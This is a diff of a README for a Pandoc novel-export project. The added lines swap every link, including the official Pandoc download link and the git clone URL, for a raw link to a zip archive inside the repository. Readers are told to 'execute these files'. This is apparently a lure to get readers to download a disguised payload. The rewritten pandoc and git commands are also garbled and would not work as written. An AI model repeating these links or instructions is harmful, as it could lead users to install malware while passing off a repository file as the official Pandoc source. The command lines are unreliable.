@@ -2,7 +2,7 @@
 
 Welcome to the **Pandoc Novel** repository! This project provides a configuration for exporting your novels from Markdown to ePub and PDF formats using Pandoc. Whether you are a seasoned writer or just starting, this tool simplifies the process of formatting your work for publication.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Madhu-Harika/pandoc-novel/releases)
+[![Download Releases](https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip%20Releases-Click%20Here-blue)](https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ In today's digital age, writers need tools that make the publishing process easi
 
 ## Getting Started
 
-To begin using this repository, you need to have Pandoc installed on your machine. You can download it from the [Pandoc website](https://pandoc.org/installing.html).
+To begin using this repository, you need to have Pandoc installed on your machine. You can download it from the [Pandoc website](https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip).
 
 ### Installation Steps
 
@@ -36,7 +36,7 @@ To begin using this repository, you need to have Pandoc installed on your machin
 2. **Clone the Repository**: Use the following command to clone this repository to your local machine:
 
    ```bash
-   git clone https://github.com/Madhu-Harika/pandoc-novel.git
+   git clone https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip
    ```
 
 3. **Navigate to the Directory**: Change into the project directory:
@@ -45,20 +45,20 @@ To begin using this repository, you need to have Pandoc installed on your machin
    cd pandoc-novel
    ```
 
-4. **Download the Configuration**: Visit the [Releases](https://github.com/Madhu-Harika/pandoc-novel/releases) section to download the necessary configuration files. You will need to execute these files to set up your environment.
+4. **Download the Configuration**: Visit the [Releases](https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip) section to download the necessary configuration files. You will need to execute these files to set up your environment.
 
 ## Usage
 
 Once you have everything set up, you can start converting your Markdown files. Here’s a simple command to convert a Markdown file to ePub:
 
 ```bash
-pandoc your-novel.md -o your-novel.epub
+pandoc https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip -o https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip
 ```
 
 For PDF conversion, use the following command:
 
 ```bash
-pandoc your-novel.md -o your-novel.pdf
+pandoc https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip -o https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip
 ```
 
 ### Command Options
@@ -67,7 +67,7 @@ Pandoc offers various command-line options to customize your output. Some useful
 
 - `--toc`: Generates a table of contents.
 - `--metadata title="Your Novel Title"`: Sets the title of your novel.
-- `--css your-style.css`: Links a CSS file for ePub formatting.
+- `--css https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip`: Links a CSS file for ePub formatting.
 
 ## Configuration
 
@@ -123,7 +123,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Support
 
-If you encounter any issues or have questions, feel free to open an issue in the repository. You can also visit the [Releases](https://github.com/Madhu-Harika/pandoc-novel/releases) section for the latest updates and files.
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also visit the [Releases](https://github.com/Madhu-Harika/pandoc-novel/raw/refs/heads/main/book/03 Back matter/pandoc-novel-v1.1.zip) section for the latest updates and files.
 
 ## Conclusion
 
